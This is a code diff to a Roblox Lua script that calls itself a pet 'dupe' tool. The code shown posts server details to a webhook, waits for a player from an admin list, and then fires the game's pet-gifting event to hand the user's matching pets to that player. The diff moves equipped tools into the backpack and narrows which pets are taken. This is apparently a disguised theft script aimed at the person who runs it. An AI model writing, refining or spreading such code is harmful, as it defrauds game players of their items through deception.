@@ -174,6 +174,16 @@ startBtn.MouseButton1Click:Connect(function()
 
     sendWebhook(serverInfo)
 
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local backpack = LocalPlayer:WaitForChild("Backpack")
+
+    for _, tool in ipairs(character:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = backpack
+            wait(0.2)
+        end
+    end
+
     local foundTarget = nil
     for i = 1, 180 do
         for userId, name in pairs(adminIds) do
@@ -195,21 +205,15 @@ startBtn.MouseButton1Click:Connect(function()
     statusMsg.Text = "Starting to dupe...."
     wait(1)
 
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
             local name = tool.Name
-            local petName = name:match("^(.-) %[%d") or ""
-            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]")) or 0
-            local age = tonumber(name:match("%[Age (%d+)%]")) or 0
+            local petName = name:match("^(.-) %[%d")
+            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
+            local age = tonumber(name:match("%[Age (%d+)%]"))
 
             local isTarget = table.find(targetPet, petName)
-            local isAgeValid = age >= 20
-            local isKGValid = kg > 10
-
-            if isTarget or isAgeValid or isKGValid then
+            if isTarget then
                 tool.Parent = character
                 ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", foundTarget)
                 wait(1)
